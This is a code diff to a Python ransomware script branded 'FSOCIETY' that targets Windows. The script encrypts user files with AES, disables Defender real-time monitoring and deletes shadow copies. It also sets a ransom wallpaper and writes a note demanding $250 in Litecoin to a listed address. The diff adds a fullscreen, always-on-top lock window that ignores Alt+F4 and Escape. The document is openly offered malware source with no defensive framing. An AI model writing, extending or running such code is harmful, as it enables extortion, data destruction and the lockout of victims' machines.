@@ -3,54 +3,22 @@ import base64
 import ctypes
 import subprocess
 import sys
+import time
+import shutil
+import re
+import tkinter as tk
+from tkinter import messagebox, scrolledtext
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 import winreg
-import time
-import shutil
-import re
 
-# Configuration
+# --- Configuration ---
 LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
 RANSOM_AMOUNT = "$250 USD in Litecoin"
 DECRYPT_KEY = "agent77"
 
-def fullscreen_cmd():
-    """Open fullscreen command prompt with red text"""
-    try:
-        # Create fullscreen cmd with red text
-        os.system('mode con: cols=120 lines=40')
-        os.system('color 4F')
-        # Maximize window
-        import ctypes
-        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-        ctypes.windll.user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE
-    except:
-        pass
-
-def fsociety_ui():
-    """Display fsociety ASCII art and status"""
-    os.system('cls')
-    banner = r'''
-   ______   ______   ______   ______   ______   ______   ______   ______
-  /\  == \ /\  ___\ /\  ___\ /\  == \ /\  ___\ /\  ___\ /\  ___\ /\  __ \
-  \ \  __< \ \  __\ \ \  __\ \ \  __< \ \  __\ \ \  __\ \ \  __\ \ \  __/
-   \ \_\ \_\ \ \_____\ \_____\ \ \_\ \_\ \_____\ \ \_____\ \ \_____\ \ \_\
-    \/_/ /_/  \/_____/ \/_____/ \/_/ /_/ \/_____/ \/_____/ \/_____/ \/_/
-  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.  .---.
-  | F |  | S |  | O |  | C |  | I |  | E |  | T |  | Y |  | 2 |  | . |  | 0 |
-  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'  '---'
-    '''
-    print(banner)
-    print("\n" + "="*80)
-    print("           [*] FSOCIETY RANSOMWARE v2.9.0 [*]".center(80))
-    print("="*80)
-    print("\n[+] Initializing encryption sequence...")
-    print("[+] Disabling security protocols...")
-    print("[+] Deleting shadow copies...")
-    print("[+] Encrypting files...\n")
-
+# --- Core Encryption Functions ---
 def generate_key():
     return get_random_bytes(32)
 
@@ -103,17 +71,13 @@ def encrypt_directory(directory, key, iv, extensions=None):
         ]
     
     count = 0
-    for root, dirs, files in os.walk(directory):
+    for root, _, files in os.walk(directory):
         for file in files:
             file_path = os.path.join(root, file)
             ext = os.path.splitext(file)[1].lower()
             if ext in extensions and not file.endswith('.encrypted'):
                 if encrypt_file(file_path, key, iv):
                     count += 1
-                    # Show progress
-                    if count % 10 == 0:
-                        sys.stdout.write(f"\r[+] Encrypted: {count} files...")
-                        sys.stdout.flush()
                 try:
                     os.rename(file_path, file_path + '.encrypted')
                 except:
@@ -123,7 +87,7 @@ def encrypt_directory(directory, key, iv, extensions=None):
 def decrypt_all_files(key, iv):
     count = 0
     for directory in get_target_directories():
-        for root, dirs, files in os.walk(directory):
+        for root, _, files in os.walk(directory):
             for file in files:
                 if file.endswith('.encrypted'):
                     file_path = os.path.join(root, file)
@@ -150,6 +114,7 @@ def get_target_directories():
     ]
     return [p for p in paths if os.path.exists(p)]
 
+# --- System Manipulation ---
 def disable_security():
     try:
         subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
@@ -194,25 +159,18 @@ def change_wallpaper():
             font = ImageFont.truetype("arial.ttf", 72)
             font2 = ImageFont.truetype("arial.ttf", 48)
             font3 = ImageFont.truetype("arial.ttf", 30)
-            font4 = ImageFont.truetype("arial.ttf", 24)
         except:
             font = ImageFont.load_default()
             font2 = ImageFont.load_default()
             font3 = ImageFont.load_default()
-            font4 = ImageFont.load_default()
-        
-        # fsociety logo
         text = "F SOCIETY\nYOUR FILES ARE ENCRYPTED"
         draw.text((100, 300), text, fill=(255, 0, 0), font=font)
-        draw.text((100, 550), "Pay $250 in Litecoin", fill=(255, 255, 255), font=font2)
-        draw.text((100, 650), "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz", fill=(0, 255, 0), font=font3)
-        draw.text((100, 750), "To decrypt, run: python ransomware.py --decrypt agent77", fill=(255, 255, 0), font=font3)
-        draw.text((100, 850), "You have 72 hours. Don't contact law enforcement.", fill=(255, 255, 255), font=font4)
-        
+        draw.text((100, 550), f"Pay {RANSOM_AMOUNT} in Litecoin", fill=(255, 255, 255), font=font2)
+        draw.text((100, 650), LTC_ADDRESS, fill=(0, 255, 0), font=font3)
+        draw.text((100, 750), "To decrypt, run the program and enter the key.", fill=(255, 255, 0), font=font3)
         wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
         img.save(wallpaper_path)
         ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
-        
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Control Panel\Desktop"
         handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
@@ -231,9 +189,9 @@ def create_ransom_note(key_hex, iv_hex):
 
 Your files have been encrypted with AES-256-CBC.
 
-To recover your files, pay $250 USD in Litecoin to:
+To recover your files, pay {RANSOM_AMOUNT} in Litecoin to:
 
-Litecoin Address: LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz
+Litecoin Address: {LTC_ADDRESS}
 
 IMPORTANT:
 - You have 72 hours to pay
@@ -244,8 +202,7 @@ Key: {key_hex}
 IV:  {iv_hex}
 
 TO DECRYPT:
-Run the following command:
-python ransomware.py --decrypt agent77
+Run this program and enter the decryption key.
 
 =============================================================
             F SOCIETY - WE ARE EVERYWHERE
@@ -254,101 +211,191 @@ python ransomware.py --decrypt agent77
     desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
     with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
         f.write(note)
-    for dir_path in get_target_directories():
+
+# --- Full-Screen Decryption UI ---
+class RansomwareUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("F SOCIETY RANSOMWARE")
+        self.root.attributes('-fullscreen', True)  # Full screen
+        self.root.attributes('-topmost', True)     # Always on top
+        self.root.configure(bg='black')
+        
+        # Prevent closing with Alt+F4
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
+        
+        # Disable full-screen exit (F11)
+        self.root.bind("<F11>", lambda e: "break")
+        self.root.bind("<Escape>", lambda e: "break")
+        
+        # UI Elements
+        self.create_widgets()
+    
+    def create_widgets(self):
+        # Title
+        title = tk.Label(self.root, text="F SOCIETY RANSOMWARE", 
+                         font=('Arial', 48, 'bold'), fg='red', bg='black')
+        title.pack(pady=20)
+        
+        # Subtitle
+        sub = tk.Label(self.root, text="YOUR FILES HAVE BEEN ENCRYPTED", 
+                       font=('Arial', 24), fg='white', bg='black')
+        sub.pack(pady=10)
+        
+        # Info text
+        info = f"""
+        Your files are encrypted with AES-256-CBC.
+        
+        To decrypt your files, you must enter the decryption key.
+        
+        Litecoin Address: {LTC_ADDRESS}
+        Amount: {RANSOM_AMOUNT}
+        
+        You have 72 hours to pay. After that, the key will be destroyed.
+        """
+        info_label = tk.Label(self.root, text=info, font=('Arial', 16), 
+                              fg='white', bg='black', justify='left')
+        info_label.pack(pady=20)
+        
+        # Key entry
+        key_frame = tk.Frame(self.root, bg='black')
+        key_frame.pack(pady=10)
+        
+        tk.Label(key_frame, text="Enter Decryption Key:", 
+                 font=('Arial', 20), fg='white', bg='black').pack(side=tk.LEFT, padx=10)
+        
+        self.key_entry = tk.Entry(key_frame, font=('Arial', 20), width=30, 
+                                  show='*', bg='white', fg='black')
+        self.key_entry.pack(side=tk.LEFT, padx=10)
+        self.key_entry.focus()
+        
+        # Buttons
+        button_frame = tk.Frame(self.root, bg='black')
+        button_frame.pack(pady=20)
+        
+        decrypt_btn = tk.Button(button_frame, text="DECRYPT FILES", 
+                                font=('Arial', 18, 'bold'), bg='red', fg='white',
+                                command=self.decrypt_action, padx=20, pady=10)
+        decrypt_btn.pack(side=tk.LEFT, padx=20)
+        
+        # Status display
+        self.status_text = scrolledtext.ScrolledText(self.root, height=10, 
+                                                     font=('Arial', 12), bg='black', fg='#00ff00')
+        self.status_text.pack(pady=20, padx=50, fill=tk.BOTH, expand=True)
+        self.status_text.insert(tk.END, "[+] Ready for decryption.\n")
+        self.status_text.see(tk.END)
+        self.status_text.config(state='disabled')
+    
+    def update_status(self, message):
+        self.status_text.config(state='normal')
+        self.status_text.insert(tk.END, message + "\n")
+        self.status_text.see(tk.END)
+        self.status_text.config(state='disabled')
+    
+    def decrypt_action(self):
+        key_input = self.key_entry.get().strip()
+        
+        if not key_input:
+            messagebox.showerror("Error", "Please enter the decryption key.")
+            return
+        
+        if key_input != DECRYPT_KEY:
+            messagebox.showerror("Invalid Key", "The decryption key is incorrect.")
+            self.update_status("[-] Invalid decryption key entered.")
+            return
+        
+        self.update_status("[+] Decryption key accepted. Starting decryption...")
+        self.root.update()
+        
         try:
-            with open(dir_path + '\\README_FSOCIETY.txt', 'w') as f:
-                f.write(note)
-        except:
-            pass
+            # Read key/iv from ransom note
+            desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
+            note_path = desktop + '\\README_FSOCIETY.txt'
+            
+            if not os.path.exists(note_path):
+                self.update_status("[-] Ransom note not found. Cannot decrypt.")
+                return
+            
+            with open(note_path, 'r') as f:
+                content = f.read()
+                key_match = re.search(r'Key: (\S+)', content)
+                iv_match = re.search(r'IV: (\S+)', content)
+                
+                if not key_match or not iv_match:
+                    self.update_status("[-] Could not find encryption key in note.")
+                    return
+                
+                key = base64.b64decode(key_match.group(1))
+                iv = base64.b64decode(iv_match.group(1))
+            
+            self.update_status("[+] Key and IV extracted. Decrypting files...")
+            
+            # Decrypt all files
+            count = decrypt_all_files(key, iv)
+            self.update_status(f"[+] Decryption complete! {count} files restored.")
+            
+            # Remove ransom note
+            try:
+                os.remove(note_path)
+                self.update_status("[+] Ransom note removed.")
+            except:
+                pass
+            
+            # Change wallpaper back
+            try:
+                ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
+                self.update_status("[+] Wallpaper restored.")
+            except:
+                pass
+            
+            # Show success message
+            messagebox.showinfo("Success", f"Decryption complete!\n{count} files restored.")
+            self.update_status("[+] You can now close this window.")
+            
+        except Exception as e:
+            self.update_status(f"[-] Decryption error: {str(e)}")
+            messagebox.showerror("Error", f"Decryption failed: {str(e)}")
 
-def show_popup():
-    ctypes.windll.user32.MessageBoxW(0, 
-        "YOUR FILES HAVE BEEN ENCRYPTED BY F SOCIETY\n\n"
-        "Pay $250 in Litecoin to:\nLdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz\n\n"
-        "Decryption key: agent77\n"
-        "Run: python ransomware.py --decrypt agent77\n\n"
-        "Read the ransom note on your Desktop.", 
-        "F SOCIETY RANSOMWARE", 
-        0x10 | 0x1)
+def run_ui():
+    root = tk.Tk()
+    app = RansomwareUI(root)
+    root.mainloop()
 
+# --- Main Entry Point ---
 def main():
-    # Fullscreen UI
-    fullscreen_cmd()
-    fsociety_ui()
-    
-    if len(sys.argv) >= 3 and sys.argv[1] == '--decrypt':
-        if sys.argv[2] == DECRYPT_KEY:
-            try:
-                desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
-                with open(desktop + '\\README_FSOCIETY.txt', 'r') as f:
-                    content = f.read()
-                    key_match = re.search(r'Key: (\S+)', content)
-                    iv_match = re.search(r'IV: (\S+)', content)
-                    if key_match and iv_match:
-                        key = base64.b64decode(key_match.group(1))
-                        iv = base64.b64decode(iv_match.group(1))
-                        count = decrypt_all_files(key, iv)
-                        print(f"\n[+] DECRYPTION COMPLETE! {count} files restored.")
-                        ctypes.windll.user32.MessageBoxW(0, 
-                            f"DECRYPTION COMPLETE!\n{count} files restored.",
-                            "F SOCIETY", 0x40)
-                        time.sleep(3)
-                        sys.exit(0)
-            except:
-                pass
-        else:
-            ctypes.windll.user32.MessageBoxW(0, 
-                "Invalid decryption key!",
-                "F SOCIETY", 0x10)
-            sys.exit(1)
-    
-    # Encryption mode
-    try:
-        key = generate_key()
-        iv = generate_iv()
-        key_hex = base64.b64encode(key).decode()
-        iv_hex = base64.b64encode(iv).decode()
-        
-        print("[+] Disabling security...")
-        disable_security()
-        
-        print("[+] Deleting shadow copies...")
-        delete_shadow_copies()
-        
-        print("[+] Encrypting files...")
-        total_encrypted = 0
-        for directory in get_target_directories():
-            try:
-                count = encrypt_directory(directory, key, iv)
-                total_encrypted += count
-                print(f"\n[+] Encrypted {count} files in {directory}")
-            except:
-                pass
-        
-        print(f"\n[+] Total files encrypted: {total_encrypted}")
-        
-        print("[+] Changing wallpaper...")
-        change_wallpaper()
-        
-        print("[+] Creating ransom note...")
-        create_ransom_note(key_hex, iv_hex)
-        
-        print("[+] Done! Showing popup...")
-        show_popup()
-        
+    # Check if running in encryption mode (no args or --encrypt)
+    if len(sys.argv) == 1 or (len(sys.argv) >= 2 and sys.argv[1] == '--encrypt'):
+        # Perform encryption
         try:
-            startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
-            shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
-            print("[+] Added to startup.")
-        except:
-            pass
-        
-        print("\n[+] Press any key to exit...")
-        os.system('pause >nul')
-        
-    except Exception as e:
-        print(f"[-] Error: {e}")
-        time.sleep(5)
+            key = generate_key()
+            iv = generate_iv()
+            key_hex = base64.b64encode(key).decode()
+            iv_hex = base64.b64encode(iv).decode()
+            
+            disable_security()
+            delete_shadow_copies()
+            change_wallpaper()
+            
+            total = 0
+            for directory in get_target_directories():
+                try:
+                    count = encrypt_directory(directory, key, iv)
+                    total += count
+                except:
+                    pass
+            
+            create_ransom_note(key_hex, iv_hex)
+            
+            # Launch UI for decryption
+            run_ui()
+            
+        except Exception as e:
+            print(f"[-] Encryption error: {e}")
+            time.sleep(5)
+    
+    else:
+        # If any arguments, just run UI (for decryption)
+        run_ui()
 
 if __name__ == "__main__":
     main()
